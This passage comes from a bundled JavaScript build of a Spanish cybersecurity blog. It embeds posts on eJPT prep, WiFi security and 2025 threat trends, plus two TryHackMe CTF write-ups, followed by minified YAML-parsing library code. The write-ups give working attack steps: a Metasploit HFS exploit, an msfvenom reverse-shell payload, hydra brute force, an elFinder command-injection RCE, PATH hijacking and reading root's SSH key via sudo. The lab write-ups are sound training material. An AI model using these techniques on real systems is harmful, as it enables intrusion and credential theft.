| **SMB / Windows** | Blue |\r
| **WordPress** | Blog |\r
| **Drupal** | Overpass |\r
| **FTP Anon** | Kenobi |\r
| **Command Injection** | DVWA |\r
| **Pivoting** | Internal |\r
| **Linux PrivEsc** | Vulnversity |\r
| **Meterpreter** | Metasploit |\r
\r
### 🎯 La Ruta Óptima (Time-Crunch)\r
Si tienes poco tiempo y necesitas cubrir el 80% del examen con el mínimo esfuerzo, completa estas 7 salas en orden:\r
\r
1.  **Network Services** (Bases de enumeración)\r
2.  **Blue** (Dominio de Windows/SMB)\r
3.  **Blog** (Ataques a WordPress)\r
4.  **Overpass** (Manejo de Drupal y web)\r
5.  **Kenobi** (Samba/NFS y Linux)\r
6.  **Vulnversity** (Fuzzing y PrivEsc)\r
7.  **Internal** (Pivoting y Redes)\r
\r
> **Conclusión Profesional:**\r
> Esta ruta no solo te prepara para aprobar el eJPT, sino que construye una metodología sólida de pentesting. La clave del éxito en el examen no es memorizar herramientas, sino entender el flujo: **Enumerar > Identificar Vector > Explotar > Post-Explotación > Pivotar**.\r
\r
## *¡Mucha suerte en tu certificación! Mantén la calma, enumera todo dos veces y "Try Harder".*\r
\r
\r
\r
`,__vite_glob_0_26=`---\r
title: "Seguridad en Redes WiFi: Cómo Proteger tu Red Inalámbrica"\r
description: "La seguridad en redes WiFi es fundamental para proteger la información y prevenir accesos no autorizados. Aprende las mejores prácticas y herramientas para asegurar tu red inalámbrica."\r
date: "2025-11-05"\r
published: true\r
tags: ["WiFi", "redes", "seguridad", "ciberseguridad", "pentesting"]\r
readTime: "7 min"\r
---\r
\r
## Introducción\r
\r
Las **redes WiFi** se han convertido en una pieza esencial de la infraestructura digital moderna. Sin embargo, también representan un punto de entrada crítico para atacantes si no están correctamente protegidas.  \r
Este artículo explora las **vulnerabilidades más comunes**, las mejores prácticas de seguridad y algunas técnicas de pentesting aplicadas a entornos controlados.\r
\r
---\r
\r
## 🔐 Vulnerabilidades Comunes en Redes WiFi\r
\r
1. **WEP obsoleto**  \r
   - Protocolo inseguro y fácilmente crackeable.  \r
   - Recomendación: usar **WPA3** o al menos **WPA2** con cifrado AES.\r
\r
2. **Contraseñas débiles**  \r
   - Claves predecibles o compartidas aumentan el riesgo de acceso no autorizado.  \r
   - Recomendación: usar contraseñas largas, aleatorias y únicas.\r
\r
3. **SSID visibles**  \r
   - Exponer el nombre de la red facilita ataques de escaneo.  \r
   - Recomendación: ocultar SSID o implementar filtrado MAC.\r
\r
4. **Redes abiertas**  \r
   - Las redes sin contraseña permiten a cualquiera conectarse y comprometer la privacidad.  \r
   - Recomendación: siempre cifrar la red con WPA2/WPA3.\r
\r
5. **Ataques de Evil Twin**  \r
   - El atacante crea un punto de acceso falso para interceptar tráfico.  \r
   - Recomendación: usar certificados, VPN y verificar la autenticidad del AP.\r
\r
---\r
\r
## 🛠️ Herramientas de Seguridad y Pentesting WiFi\r
\r
- **Aircrack-ng**: Suite para auditar redes inalámbricas y test de fuerza bruta en contraseñas.  \r
- **Kismet**: Detector de redes WiFi, sniffer y herramienta de análisis de tráfico.  \r
- **Wireshark**: Inspección detallada de paquetes capturados.  \r
- **Wifite**: Automatización de ataques en entornos controlados para pruebas de pentesting.\r
\r
> ⚠️ Todas las pruebas deben realizarse en **entornos controlados y autorizados**, nunca en redes ajenas.\r
\r
---\r
\r
## 🧩 Mejores Prácticas para Proteger tu WiFi\r
\r
1. **Actualizar firmware del router regularmente**  \r
   - Corrige vulnerabilidades conocidas y mejora la estabilidad.  \r
\r
2. **Usar cifrado fuerte**  \r
   - WPA3 es la opción más segura actualmente.  \r
\r
3. **Configurar contraseñas robustas**  \r
   - Mezcla de mayúsculas, minúsculas, números y caracteres especiales.  \r
\r
4. **Segmentar redes**  \r
   - Separar la red de invitados de la red corporativa o doméstica principal.  \r
\r
5. **Monitorear actividad de red**  \r
   - Revisar dispositivos conectados y tráfico sospechoso periódicamente.  \r
\r
6. **Implementar VPN y autenticación adicional**  \r
   - Protege el tráfico incluso si la red es comprometida.\r
\r
---\r
\r
## 📈 Metodología de Auditoría WiFi\r
\r
1. **Reconocimiento**  \r
   - Identificación de SSID, canales y clientes conectados.  \r
\r
2. **Análisis de seguridad**  \r
   - Comprobar tipo de cifrado, contraseñas y vulnerabilidades conocidas.  \r
\r
3. **Pruebas controladas de penetración**  \r
   - Simular ataques de fuerza bruta o de Evil Twin en entornos de laboratorio.  \r
\r
4. **Reporte y mitigación**  \r
   - Documentar hallazgos y aplicar medidas correctivas para reforzar la red.\r
\r
---\r
\r
## Conclusión\r
\r
Proteger una **red WiFi** requiere una combinación de **configuración segura, monitoreo constante y buenas prácticas**.  \r
El conocimiento sobre cómo los atacantes podrían explotar vulnerabilidades es clave para anticiparse y mantener la confidencialidad, integridad y disponibilidad de los datos.  \r
\r
> Una red bien protegida es la primera línea de defensa en cualquier estrategia de ciberseguridad.`,__vite_glob_0_27=`---\r
title: "Steel Mountain"\r
description: "Writeup de la sala Steel Mountain de TryHackMe. Una guía para comprometer una máquina Windows explotando un servidor de archivos HFS y escalando privilegios mediante Unquoted Service Path."\r
date: "2025-12-24"\r
published: true\r
tags: ["tryhackme", "pentesting", "writeup", "windows", "privilege escalation", "metasploit"]\r
readTime: "20 min"\r
---\r
\r
# Steel Mountain — Writeup TryHackMe\r
\r
## 📖 Introducción\r
\r
La sala **Steel Mountain** de TryHackMe es un excelente entorno para practicar la enumeración y explotación de sistemas Windows. En este reto, nos enfrentaremos a un servidor web vulnerable y aprenderemos a escalar privilegios abusando de una mala configuración en los servicios del sistema conocida como **Unquoted Service Path**.\r
\r
Esta máquina es ideal para entender cómo las vulnerabilidades en software de terceros y las configuraciones inseguras pueden comprometer un sistema entero.\r
\r
---\r
\r
## 🔎 Reconocimiento\r
\r
Comenzamos nuestra fase de reconocimiento con un escaneo de puertos utilizando **Nmap** para descubrir los servicios activos.\r
\r
\`\`\`bash\r
nmap -sVC -T4 -p- <IP-MAQUINA>\r
\`\`\`\r
\r
**Resultados principales:**\r
\r
- **80/tcp (HTTP):** Microsoft IIS httpd 8.5.\r
- **8080/tcp (HTTP):** Rejetto HTTP File Server 2.3.\r
- **135/tcp (MSRPC):** Microsoft Windows RPC.\r
- **139/445 (SMB):** Microsoft Windows netbios-ssn.\r
- **3389/tcp (RDP):** Microsoft Terminal Services.\r
\r
Al visitar el puerto **80**, encontramos una página web con la foto del "Empleado del mes" (Bill Harper). Sin embargo, el puerto **8080** resulta mucho más interesante.\r
\r
### Enumeración Web (Puerto 8080)\r
\r
Al acceder a \`http://<IP>:8080\`, nos encontramos con una aplicación llamada **Rejetto HTTP File Server 2.3**.\r
\r
Una búsqueda rápida de vulnerabilidades para esta versión revela que es susceptible a una ejecución remota de código (RCE).\r
\r
- **Vulnerabilidad:** Rejetto HFS 2.3 RCE\r
- **CVE:** CVE-2014-6287\r
\r
---\r
\r
## 🚀 Acceso Inicial\r
\r
Para explotar esta vulnerabilidad, podemos utilizar **Metasploit**.\r
\r
1. Iniciamos Metasploit y buscamos el exploit:\r
\r
\`\`\`bash\r
msfconsole\r
search rejetto\r
use exploit/windows/http/rejetto_hfs_exec\r
\`\`\`\r
\r
2. Configuramos las opciones necesarias:\r
\r
\`\`\`bash\r
set RHOSTS <IP-MAQUINA>\r
set RPORT 8080\r
set LHOST <TU-IP-VPN>\r
run\r
\`\`\`\r
\r
Si el exploit tiene éxito, obtendremos una sesión de **Meterpreter** con acceso al sistema. Podemos buscar la primera bandera en el escritorio del usuario.\r
\r
\`\`\`bash\r
cd C:/Users/bill/Desktop\r
cat user.txt\r
\`\`\`\r
\r
---\r
\r
## 🔐 Escalada de Privilegios\r
\r
Ahora que tenemos acceso inicial, necesitamos elevar nuestros privilegios a \`SYSTEM\`. Para ello, utilizaremos un script de enumeración como **PowerUp.ps1** (parte de PowerSploit) para buscar vectores de escalada.\r
\r
### Enumeración con PowerUp\r
\r
Subimos el script a la máquina víctima:\r
\r
\`\`\`bash\r
upload /ruta/a/PowerUp.ps1\r
load powershell\r
powershell_shell\r
. .\\PowerUp.ps1\r
Invoke-AllChecks\r
\`\`\`\r
\r
El script identifica una vulnerabilidad interesante: **Unquoted Service Path** en el servicio \`AdvancedSystemCareService9\`.\r
\r
### ¿Qué es Unquoted Service Path?\r
\r
Cuando un servicio de Windows tiene una ruta de ejecutable que contiene espacios y no está entre comillas (por ejemplo, \`C:\\Program Files (x86)\\IObit\\Advanced SystemCare\\ASCService.exe\`), Windows intenta ejecutar el programa en el siguiente orden:\r
\r
1. \`C:\\Program.exe\`\r
2. \`C:\\Program Files.exe\`\r
3. \`C:\\Program Files (x86)\\IObit\\Advanced.exe\`\r
4. ... y finalmente el ejecutable real.\r
\r
Si tenemos permisos de escritura en alguna de estas carpetas intermedias, podemos colocar nuestro propio ejecutable malicioso y Windows lo ejecutará con los privilegios del servicio (en este caso, \`SYSTEM\`).\r
\r
### Explotación\r
\r
1. **Generar payload:** Creamos un ejecutable malicioso con \`msfvenom\` llamado \`Advanced.exe\` (para que coincida con la parte "Advanced" de la ruta).\r
\r
\`\`\`bash\r
msfvenom -p windows/shell_reverse_tcp LHOST=<TU-IP> LPORT=4444 -f exe -o Advanced.exe\r
\`\`\`\r
\r
2. **Detener el servicio:**\r
\r
\`\`\`bash\r
sc stop AdvancedSystemCareService9\r
\`\`\`\r
\r
3. **Subir y colocar el payload:** Subimos \`Advanced.exe\` a la carpeta \`C:\\Program Files (x86)\\IObit\\\`.\r
\r
\`\`\`bash\r
cd "C:\\Program Files (x86)\\IObit"\r
upload Advanced.exe\r
\`\`\`\r
\r
4. **Reiniciar el servicio:** Iniciamos un listener de Netcat en nuestra máquina atacante y arrancamos el servicio.\r
\r
\`\`\`bash\r
# En tu máquina local\r
nc -lvnp 4444\r
\`\`\`\r
\r
\`\`\`bash\r
# En la máquina víctima\r
sc start AdvancedSystemCareService9\r
\`\`\`\r
\r
Al iniciar el servicio, Windows ejecutará nuestro \`Advanced.exe\` en lugar del servicio legítimo, otorgándonos una shell con privilegios de **SYSTEM**.\r
\r
### Bandera Root\r
\r
Finalmente, navegamos al escritorio del administrador para obtener la bandera final.\r
\r
\`\`\`bash\r
cd C:\\Users\\Administrator\\Desktop\r
type root.txt\r
\`\`\`\r
\r
---\r
\r
## 📝 Conclusión\r
\r
La máquina Steel Mountain nos enseña la importancia de mantener el software actualizado (Rejetto HFS) y de configurar correctamente los servicios del sistema. La vulnerabilidad de **Unquoted Service Path** es un clásico en entornos Windows y una "fruta madura" (low-hanging fruit) que todo pentester debe saber identificar.\r
`,__vite_glob_0_28=`---\r
title: "Tendencias Críticas en Ciberseguridad: Amenazas y Avances que Marcan el 2025"\r
description: "Un análisis profesional sobre los incidentes más relevantes de ciberseguridad y las tendencias que están redefiniendo el panorama global en 2025."\r
date: "2025-11-16"\r
published: true\r
tags: ["ciberseguridad", "amenazas", "noticias", "actualidad"]\r
readTime: "7 min"\r
---\r
\r
## Panorama General de la Ciberseguridad en 2025\r
\r
El año 2025 ha estado marcado por un aumento significativo en ataques dirigidos y sofisticación de las técnicas empleadas por grupos APT. Las empresas, gobiernos y proveedores de servicios críticos han tenido que adaptarse rápidamente para contrarrestar incidentes que están redefiniendo las estrategias de defensa modernas.\r
\r
Los expertos coinciden en que la combinación de **automatización ofensiva**, **explotación masiva de vulnerabilidades de día cero** y el **uso intensivo de inteligencia artificial** por parte de actores maliciosos está elevando la superficie de riesgo a máximos históricos.\r
\r
---\r
\r
## 1. Incremento de los Ataques a la Cadena de Suministro\r
\r
Durante este año, múltiples compañías fueron afectadas por compromisos que se originaron en proveedores de software. Estos ataques destacan por su capacidad de propagarse de manera silenciosa aprovechando integraciones legítimas.\r
\r
Las autoridades recomiendan adoptar políticas de **Zero Trust**, validación estricta de dependencias y análisis continuos del comportamiento del software distribuido por terceros.\r
\r
---\r
\r
## 2. Auge del Ransomware Extorsivo\r
\r
El modelo tradicional de cifrado está evolucionando. Los grupos criminales ahora se enfocan en:\r
\r
- Robo masivo de datos sensibles  \r
- Publicación escalonada para aumentar presión  \r
- Ataques coordinados contra respaldos en la nube  \r
\r
El impacto económico supera cifras récord, obligando a organizaciones a fortalecer sus planes de contingencia, copias inmutables y monitoreo de actividad anómala.\r
\r
---\r
\r
## 3. Vulnerabilidades de Día Cero en Dispositivos IoT\r
\r
La expansión de dispositivos conectados continúa siendo un punto débil. Investigadores han reportado varias fallas críticas en sensores industriales, cámaras inteligentes y equipos médicos.  \r
Estas brechas podrían permitir accesos remotos no autorizados o interrupciones operativas.\r
\r
La recomendación clave es implementar **segmentación de red**, autenticación reforzada y actualizaciones regulares de firmware.\r
\r
---\r
\r
## 4. Inteligencia Artificial en Defensa y Ataque\r
\r
La **IA es protagonista** tanto en la detección como en la ejecución de ataques. Las organizaciones están incorporando sistemas capaces de identificar patrones inusuales en segundos, mientras que los atacantes utilizan modelos generativos para automatizar reconocimiento, evasión y campañas de phishing hiperrealistas.\r
\r
El desafío es encontrar un equilibrio entre automatización defensiva y supervisión humana especializada.\r
\r
---\r
\r
## 5. Regulaciones Internacionales Más Estrictas\r
\r
Nuevas leyes de privacidad y ciberseguridad entraron en vigencia este año en varias regiones, exigiendo:\r
\r
- Notificaciones obligatorias de incidentes  \r
- Auditorías de seguridad continuas  \r
- Protección reforzada de infraestructuras críticas  \r
- Transparencia en el uso de IA y algoritmos  \r
\r
Esto obliga a las organizaciones a invertir más en cumplimiento normativo y gestión de riesgos.\r
\r
---\r
\r
## Conclusión\r
\r
El **2025** representa un punto de inflexión para la ciberseguridad. Las amenazas evolucionan con rapidez y requieren un enfoque multidisciplinario que combine tecnología avanzada, análisis continuo y formación constante.\r
\r
Las empresas que adopten una visión preventiva, apoyada en automatización y estrategias de resiliencia, estarán mejor preparadas para enfrentar los desafíos presentes y futuros.`,__vite_glob_0_29='---\r\ntitle: "tryhackme-lookup"\r\ndescription: "Writeup de la máquina Lookup de TryHackMe: Enumeración de usuarios, explotación de elFinder y escalada de privilegios mediante Path Hijacking y Sudo."\r\ndate: "2026-01-25"\r\npublished: true\r\ntags: ["tryhackme", "writeup", "linux", "elfinder", "path-hijacking", "gtfobins"]\r\nreadTime: "12 min"\r\n---\r\n\r\n# 🔍 TryHackMe — Lookup (Paso a Paso)\r\n\r\n**Lookup** es una máquina Linux de dificultad media en TryHackMe que pone a prueba nuestras habilidades de enumeración web, fuerza bruta y escalada de privilegios explotando configuraciones inseguras y binarios SUID personalizados.\r\n\r\n---\r\n\r\n## 1) Reconocimiento y Enumeración\r\n\r\nComenzamos con un escaneo básico de puertos utilizando `nmap` para identificar los servicios expuestos.\r\n\r\n```bash\r\nnmap -sC -sV -Pn -oN  <IP_MACHINE>\r\n```\r\n\r\n**Puertos abiertos:**\r\n- `22/tcp`: SSH (OpenSSH)\r\n- `80/tcp`: HTTP (Apache)\r\n\r\nAl visitar el puerto 80, el sitio nos redirige a `lookup.thm`. Debemos agregar este dominio a nuestro archivo `/etc/hosts`.\r\n\r\n```bash\r\necho "<IP_MACHINE> lookup.thm" | sudo tee -a /etc/hosts\r\n```\r\n\r\n### Enumeración Web\r\n\r\nEl sitio web muestra un formulario de inicio de sesión. Al probar credenciales por defecto (`admin:admin`), notamos un comportamiento interesante en los mensajes de error:\r\n- "Wrong user": El usuario no existe.\r\n- "Wrong password": El usuario existe, pero la contraseña es incorrecta.\r\n\r\nEsto nos permite enumerar usuarios válidos. Podemos usar un script en Python o `hydra` si configuramos bien los mensajes de error, pero una enumeración manual o con `ffuf` revela dos usuarios potenciales:\r\n- `admin`\r\n- `jose`\r\n\r\nTras intentar fuerza bruta contra `jose` usando `hydra` y `rockyou.txt`:\r\n\r\n```bash\r\nhydra -l jose -P /usr/share/wordlists/rockyou.txt lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong password"\r\n```\r\n\r\nObtenemos la contraseña válida. Al iniciar sesión, somos redirigidos a un nuevo subdominio: `files.lookup.thm`. Lo agregamos también al `/etc/hosts`.\r\n\r\n---\r\n\r\n## 2) Explotación: elFinder\r\n\r\nAl acceder a `files.lookup.thm`, nos encontramos con **elFinder**, un gestor de archivos web. La versión detectada es **2.1.47**.\r\n\r\nEsta versión es vulnerable a una **Inyección de Comandos (Command Injection)** (CVE-2019-9194). La vulnerabilidad reside en el conector PHP (`connect.minimal.php`), que permite subir archivos y ejecutar comandos arbitrarios al manipular el nombre del archivo.\r\n\r\n### Obtención de Shell\r\n\r\nPodemos utilizar un exploit público para esta versión o hacerlo manualmente. El objetivo es subir un archivo PHP malicioso (webshell) o ejecutar un comando reverso.\r\n\r\nExisten scripts en Python disponibles en SearchSploit o GitHub para explotar esta versión automáticamente.\r\n\r\n```bash\r\nsearchsploit elfinder\r\n# Usamos el exploit para Command Injection\r\npython3 exploit_elfinder.py http://files.lookup.thm/php/connector.minimal.php\r\n```\r\n\r\nUna vez ejecutado, logramos ejecución remota de comandos (RCE) y establecemos una Reverse Shell para ganar acceso como el usuario `www-data`.\r\n\r\n---\r\n\r\n## 3) Escalada de Privilegios (Usuario)\r\n\r\nYa dentro del sistema, enumeramos los usuarios en `/home` y encontramos al usuario `think`.\r\n\r\nEn el directorio raíz `/`, o buscando binarios SUID, encontramos un ejecutable inusual: `/usr/sbin/pwm`.\r\n\r\n```bash\r\nfind / -perm -4000 2>/dev/null\r\n```\r\n\r\nAl ejecutar `pwm`, parece ser una herramienta que gestiona contraseñas. Si analizamos su comportamiento (usando `strings` o `ltrace`), vemos que llama al comando `id` para verificar el usuario actual y luego intenta leer un archivo de contraseñas en su home.\r\n\r\nEl problema es que llama a `id` sin la ruta absoluta (es decir, usa `id` en lugar de `/usr/bin/id`). Esto es vulnerable a **Path Hijacking**.\r\n\r\n### Path Hijacking\r\n\r\n1. Creamos un script falso llamado `id` en `/tmp` que imprima lo que queremos (por ejemplo, que diga que somos el usuario `think` o simplemente ejecute una shell).\r\n2. Damos permisos de ejecución.\r\n3. Modificamos la variable de entorno `$PATH` para que `/tmp` esté primero.\r\n\r\n```bash\r\ncd /tmp\r\necho -e \'#!/bin/bash\\necho "uid=1000(think) gid=1000(think) groups=1000(think)"\' > id\r\nchmod +x id\r\nexport PATH=/tmp:$PATH\r\n```\r\n\r\nAl ejecutar `/usr/sbin/pwm` ahora, utilizará nuestro `id` falso. Esto engaña al binario haciéndole creer que somos `think` y nos revela sus credenciales o nos permite acceder a su información.\r\n\r\nCon las credenciales obtenidas, nos conectamos por SSH como `think`.\r\n\r\n---\r\n\r\n## 4) Escalada de Privilegios (Root)\r\n\r\nComo usuario `think`, comprobamos los permisos de `sudo`:\r\n\r\n```bash\r\nsudo -l\r\n```\r\n\r\nVemos que podemos ejecutar el comando `/usr/bin/look` como `root` sin contraseña.\r\n\r\n### Explotación con Look\r\n\r\nConsultamos **GTFOBins** para `look`. Esta herramienta sirve para mostrar líneas que comienzan con una cadena dada en un archivo, pero si se ejecuta con `sudo`, podemos leer archivos privilegiados.\r\n\r\nPara leer la flag de root (`/root/root.txt`) o la clave SSH privada:\r\n\r\n```bash\r\nsudo look \'\' /root/root.txt\r\n# O para leer la clave SSH\r\nsudo look \'\' /root/.ssh/id_rsa\r\n```\r\n\r\nEl comando `look \'\' FILE` imprime todo el contenido del archivo porque todas las líneas "comienzan" con una cadena vacía.\r\n\r\n¡Y con esto hemos comprometido la máquina por completo!\r\n\r\n---\r\n\r\n## Resumen\r\n\r\n1. **Reconocimiento**: Enumeración de subdominios (`lookup.thm`, `files.lookup.thm`).\r\n2. **Acceso Inicial**: Enumeración de usuarios y fuerza bruta en el login -> Explotación de CVE en elFinder.\r\n3. **Escalada a Usuario**: Path Hijacking en binario SUID `pwm`.\r\n4. **Escalada a Root**: Abuso de permisos `sudo` con la herramienta `look` (File Read).\r\n',__viteBrowserExternal={},__viteBrowserExternal$1=Object.freeze(Object.defineProperty({__proto__:null,default:__viteBrowserExternal},Symbol.toStringTag,{value:"Module"})),require$$0=getAugmentedNamespace(__viteBrowserExternal$1);var kindOf,hasRequiredKindOf;function requireKindOf(){if(hasRequiredKindOf)return kindOf;hasRequiredKindOf=1;var o=Object.prototype.toString;kindOf=function(x){if(x===void 0)return"undefined";if(x===null)return"null";var P=typeof x;if(P==="boolean")return"boolean";if(P==="string")return"string";if(P==="number")return"number";if(P==="symbol")return"symbol";if(P==="function")return h(x)?"generatorfunction":"function";if(s(x))return"array";if(v(x))return"buffer";if(m(x))return"arguments";if(d(x))return"date";if(c(x))return"error";if(f(x))return"regexp";switch(i(x)){case"Symbol":return"symbol";case"Promise":return"promise";case"WeakMap":return"weakmap";case"WeakSet":return"weakset";case"Map":return"map";case"Set":return"set";case"Int8Array":return"int8array";case"Uint8Array":return"uint8array";case"Uint8ClampedArray":return"uint8clampedarray";case"Int16Array":return"int16array";case"Uint16Array":return"uint16array";case"Int32Array":return"int32array";case"Uint32Array":return"uint32array";case"Float32Array":return"float32array";case"Float64Array":return"float64array"}if(u(x))return"generator";switch(P=o.call(x),P){case"[object Object]":return"object";case"[object Map Iterator]":return"mapiterator";case"[object Set Iterator]":return"setiterator";case"[object String Iterator]":return"stringiterator";case"[object Array Iterator]":return"arrayiterator"}return P.slice(8,-1).toLowerCase().replace(/\s/g,"")};function i(b){return typeof b.constructor=="function"?b.constructor.name:null}function s(b){return Array.isArray?Array.isArray(b):b instanceof Array}function c(b){return b instanceof Error||typeof b.message=="string"&&b.constructor&&typeof b.constructor.stackTraceLimit=="number"}function d(b){return b instanceof Date?!0:typeof b.toDateString=="function"&&typeof b.getDate=="function"&&typeof b.setDate=="function"}function f(b){return b instanceof RegExp?!0:typeof b.flags=="string"&&typeof b.ignoreCase=="boolean"&&typeof b.multiline=="boolean"&&typeof b.global=="boolean"}function h(b,x){return i(b)==="GeneratorFunction"}function u(b){return typeof b.throw=="function"&&typeof b.return=="function"&&typeof b.next=="function"}function m(b){try{if(typeof b.length=="number"&&typeof b.callee=="function")return!0}catch(x){if(x.message.indexOf("callee")!==-1)return!0}return!1}function v(b){return b.constructor&&typeof b.constructor.isBuffer=="function"?b.constructor.isBuffer(b):!1}return kindOf}var isExtendable,hasRequiredIsExtendable;function requireIsExtendable(){return hasRequiredIsExtendable||(hasRequiredIsExtendable=1,isExtendable=function(i){return typeof i<"u"&&i!==null&&(typeof i=="object"||typeof i=="function")}),isExtendable}var extendShallow,hasRequiredExtendShallow;function requireExtendShallow(){if(hasRequiredExtendShallow)return extendShallow;hasRequiredExtendShallow=1;var o=requireIsExtendable();extendShallow=function(d){o(d)||(d={});for(var f=arguments.length,h=1;h<f;h++){var u=arguments[h];o(u)&&i(d,u)}return d};function i(c,d){for(var f in d)s(d,f)&&(c[f]=d[f])}function s(c,d){return Object.prototype.hasOwnProperty.call(c,d)}return extendShallow}var sectionMatter,hasRequiredSectionMatter;function requireSectionMatter(){if(hasRequiredSectionMatter)return sectionMatter;hasRequiredSectionMatter=1;var o=requireKindOf(),i=requireExtendShallow();sectionMatter=function(m,v){typeof v=="function"&&(v={parse:v});var b=c(m),x={section_delimiter:"---",parse:h},P=i({},x,v),E=P.section_delimiter,w=b.content.split(/\r?\n/),T=null,j=f(),k=[],I=[];function N(Y){b.content=Y,T=[],k=[]}function B(Y){I.length&&(j.key=d(I[0],E),j.content=Y,P.parse(j,T),T.push(j),j=f(),k=[],I=[])}for(var D=0;D<w.length;D++){var O=w[D],L=I.length,z=O.trim();if(s(z,E)){if(z.length===3&&D!==0){if(L===0||L===2){k.push(O);continue}I.push(z),j.data=k.join(`
`),k=[];continue}T===null&&N(k.join(`
`)),L===2&&B(k.join(`
`)),I.push(z);continue}k.push(O)}return T===null?N(k.join(`
`)):B(k.join(`
`)),b.sections=T,b};function s(m,v){return!(m.slice(0,v.length)!==v||m.charAt(v.length+1)===v.slice(-1))}function c(m){if(o(m)!=="object"&&(m={content:m}),typeof m.content!="string"&&!u(m.content))throw new TypeError("expected a buffer or string");return m.content=m.content.toString(),m.sections=[],m}function d(m,v){return m?m.slice(v.length).trim():""}function f(){return{key:"",data:"",content:""}}function h(m){return m}function u(m){return m&&m.constructor&&typeof m.constructor.isBuffer=="function"?m.constructor.isBuffer(m):!1}return sectionMatter}var engines={exports:{}},jsYaml$1={},loader={},common={},hasRequiredCommon;function requireCommon(){if(hasRequiredCommon)return common;hasRequiredCommon=1;function o(h){return typeof h>"u"||h===null}function i(h){return typeof h=="object"&&h!==null}function s(h){return Array.isArray(h)?h:o(h)?[]:[h]}function c(h,u){var m,v,b,x;if(u)for(x=Object.keys(u),m=0,v=x.length;m<v;m+=1)b=x[m],h[b]=u[b];return h}function d(h,u){var m="",v;for(v=0;v<u;v+=1)m+=h;return m}function f(h){return h===0&&Number.NEGATIVE_INFINITY===1/h}return common.isNothing=o,common.isObject=i,common.toArray=s,common.repeat=d,common.isNegativeZero=f,common.extend=c,common}var exception,hasRequiredException;function requireException(){if(hasRequiredException)return exception;hasRequiredException=1;function o(i,s){Error.call(this),this.name="YAMLException",this.reason=i,this.mark=s,this.message=(this.reason||"(unknown reason)")+(this.mark?" "+this.mark.toString():""),Error.captureStackTrace?Error.captureStackTrace(this,this.constructor):this.stack=new Error().stack||""}return o.prototype=Object.create(Error.prototype),o.prototype.constructor=o,o.prototype.toString=function(s){var c=this.name+": ";return c+=this.reason||"(unknown reason)",!s&&this.mark&&(c+=" "+this.mark.toString()),c},exception=o,exception}var mark,hasRequiredMark;function requireMark(){if(hasRequiredMark)return mark;hasRequiredMark=1;var o=requireCommon();function i(s,c,d,f,h){this.name=s,this.buffer=c,this.position=d,this.line=f,this.column=h}return i.prototype.getSnippet=function(c,d){var f,h,u,m,v;if(!this.buffer)return null;for(c=c||4,d=d||75,f="",h=this.position;h>0&&`\0\r
\u2028\u2029`.indexOf(this.buffer.charAt(h-1))===-1;)if(h-=1,this.position-h>d/2-1){f=" ... ",h+=5;break}for(u="",m=this.position;m<this.buffer.length&&`\0\r
\u2028\u2029`.indexOf(this.buffer.charAt(m))===-1;)if(m+=1,m-this.position>d/2-1){u=" ... ",m-=5;break}return v=this.buffer.slice(h,m),o.repeat(" ",c)+f+v+u+`
`+o.repeat(" ",c+this.position-h+f.length)+"^"},i.prototype.toString=function(c){var d,f="";return this.name&&(f+='in "'+this.name+'" '),f+="at line "+(this.line+1)+", column "+(this.column+1),c||(d=this.getSnippet(),d&&(f+=`:
`+d)),f},mark=i,mark}var type,hasRequiredType;function requireType(){if(hasRequiredType)return type;hasRequiredType=1;var o=requireException(),i=["kind","resolve","construct","instanceOf","predicate","represent","defaultStyle","styleAliases"],s=["scalar","sequence","mapping"];function c(f){var h={};return f!==null&&Object.keys(f).forEach(function(u){f[u].forEach(function(m){h[String(m)]=u})}),h}function d(f,h){if(h=h||{},Object.keys(h).forEach(function(u){if(i.indexOf(u)===-1)throw new o('Unknown option "'+u+'" is met in definition of "'+f+'" YAML type.')}),this.tag=f,this.kind=h.kind||null,this.resolve=h.resolve||function(){return!0},this.construct=h.construct||function(u){return u},this.instanceOf=h.instanceOf||null,this.predicate=h.predicate||null,this.represent=h.represent||null,this.defaultStyle=h.defaultStyle||null,this.styleAliases=c(h.styleAliases||null),s.indexOf(this.kind)===-1)throw new o('Unknown kind "'+this.kind+'" is specified for "'+f+'" YAML type.')}return type=d,type}var schema,hasRequiredSchema;function requireSchema(){if(hasRequiredSchema)return schema;hasRequiredSchema=1;var o=requireCommon(),i=requireException(),s=requireType();function c(h,u,m){var v=[];return h.include.forEach(function(b){m=c(b,u,m)}),h[u].forEach(function(b){m.forEach(function(x,P){x.tag===b.tag&&x.kind===b.kind&&v.push(P)}),m.push(b)}),m.filter(function(b,x){return v.indexOf(x)===-1})}function d(){var h={scalar:{},sequence:{},mapping:{},fallback:{}},u,m;function v(b){h[b.kind][b.tag]=h.fallback[b.tag]=b}for(u=0,m=arguments.length;u<m;u+=1)arguments[u].forEach(v);return h}function f(h){this.include=h.include||[],this.implicit=h.implicit||[],this.explicit=h.explicit||[],this.implicit.forEach(function(u){if(u.loadKind&&u.loadKind!=="scalar")throw new i("There is a non-scalar type in the implicit list of a schema. Implicit resolving of such types is not supported.")}),this.compiledImplicit=c(this,"implicit",[]),this.compiledExplicit=c(this,"explicit",[]),this.compiledTypeMap=d(this.compiledImplicit,this.compiledExplicit)}return f.DEFAULT=null,f.create=function(){var u,m;switch(arguments.length){case 1:u=f.DEFAULT,m=arguments[0];break;case 2:u=arguments[0],m=arguments[1];break;default:throw new i("Wrong number of arguments for Schema.create function")}if(u=o.toArray(u),m=o.toArray(m),!u.every(function(v){return v instanceof f}))throw new i("Specified list of super schemas (or a single Schema object) contains a non-Schema object.");if(!m.every(function(v){return v instanceof s}))throw new i("Specified list of YAML types (or a single Type object) contains a non-Type object.");return new f({include:u,explicit:m})},schema=f,schema}var str,hasRequiredStr;function requireStr(){if(hasRequiredStr)return str;hasRequiredStr=1;var o=requireType();return str=new o("tag:yaml.org,2002:str",{kind:"scalar",construct:function(i){return i!==null?i:""}}),str}var seq,hasRequiredSeq;function requireSeq(){if(hasRequiredSeq)return seq;hasRequiredSeq=1;var o=requireType();return seq=new o("tag:yaml.org,2002:seq",{kind:"sequence",construct:function(i){return i!==null?i:[]}}),seq}var map,hasRequiredMap;function requireMap(){if(hasRequiredMap)return map;hasRequiredMap=1;var o=requireType();return map=new o("tag:yaml.org,2002:map",{kind:"mapping",construct:function(i){return i!==null?i:{}}}),map}var failsafe,hasRequiredFailsafe;function requireFailsafe(){if(hasRequiredFailsafe)return failsafe;hasRequiredFailsafe=1;var o=requireSchema();return failsafe=new o({explicit:[requireStr(),requireSeq(),requireMap()]}),failsafe}var _null,hasRequired_null;function require_null(){if(hasRequired_null)return _null;hasRequired_null=1;var o=requireType();function i(d){if(d===null)return!0;var f=d.length;return 